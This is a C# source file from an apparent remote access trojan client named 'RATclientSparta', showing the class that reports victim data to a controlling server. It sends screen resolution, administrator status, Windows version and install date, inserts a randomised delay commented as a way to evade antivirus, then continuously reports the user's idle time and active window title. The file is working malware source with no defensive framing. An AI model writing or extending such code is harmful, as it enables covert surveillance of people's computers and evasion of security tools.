using RATclientSparta.Setup.RegistryData;
using RATclientSparta.Tools;
using SpartaRATclient;
using System;
using System.Drawing;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RATclientSparta.Server.Send
{
    public class SendData
    {
        private System.Net.Sockets.Socket server;
        private bool ServerConnected = true;
        public SendData(System.Net.Sockets.Socket server, bool FirstRun)
        {
            this.server = server;
            if (FirstRun)
            {
                new Thread(() =>
                {
                    this.SendDetails();
                }).Start();
            }
        }

        public void Send(byte[] message, byte messageType)
        {
            if (message.Length > 0)
            {
                try
                {
                    byte[] type = new byte[] { messageType };
                    byte[] mesLength = BitConverter.GetBytes(message.Length);
                    byte[] tlv = new byte[1 + 5 + message.Length];

                    Array.Copy(type, 0, tlv, 0, 1);
                    Array.Copy(mesLength, 0, tlv, 1, 4);
                    Array.Copy(message, 0, tlv, 6, message.Length);

                    this.server.Send(tlv);
                }
                catch { ServerConnected = false; }
            }
        }

        private void SendDetails()
        {
            //Sending screen resolution
            Rectangle resolution = Screen.PrimaryScreen.Bounds;
            Send(Encoding.ASCII.GetBytes(resolution.ToString()), 21);

            this.Send(Encoding.ASCII.GetBytes("loading"), 2); //Idle time
            this.Send(Encoding.ASCII.GetBytes("loading"), 3); //Current Window
            this.Send(Encoding.ASCII.GetBytes("0.0.0.0"), 5); //Ipaddress
            this.Send(Encoding.ASCII.GetBytes("Israel"), 6); //Country
            this.Send(Encoding.ASCII.GetBytes("Administrator"), 17); //running as Admin or User?
            this.Send(Encoding.ASCII.GetBytes("loading"), 16); //Windows Version and Type
            this.Send(Encoding.ASCII.GetBytes("loading"), 19); //Opening date

            //Long sleep to evade AV's
            Random rand = new Random();
            Thread.Sleep(rand.Next(10000, 15000));

            //Getting registry data
            RegistryGet item = new RegistryGet();
            item.GetClientData();

            //Sending the registry data
            this.Send(Encoding.ASCII.GetBytes(item.OSVersion), 16); //Windows Version and Type
            this.Send(Encoding.ASCII.GetBytes(item.OpenedDate), 19); //Opening date

            //Setting default values
            string prevIdleTime = "-1";
            string prevCurrentOpenedTab = "null";

            //Loop that sends current open window and Idle time
            while (this.ServerConnected)
            {
                if (!((IdleTime.GetIdleTime() / 1000).ToString() == prevIdleTime))
                {
                    prevIdleTime = (IdleTime.GetIdleTime() / 1000).ToString();
                    Send(Encoding.ASCII.GetBytes((IdleTime.GetIdleTime() / 1000).ToString()), 2);
                }

                CurrentOpenWindow Get = new CurrentOpenWindow();
                if (!(Get.CurrentWindow() == prevCurrentOpenedTab))
                { prevCurrentOpenedTab = Get.CurrentWindow(); this.Send(Encoding.ASCII.GetBytes(Get.CurrentWindow()), 3); }

                Thread.Sleep(1000);
            }
        }
    }
}
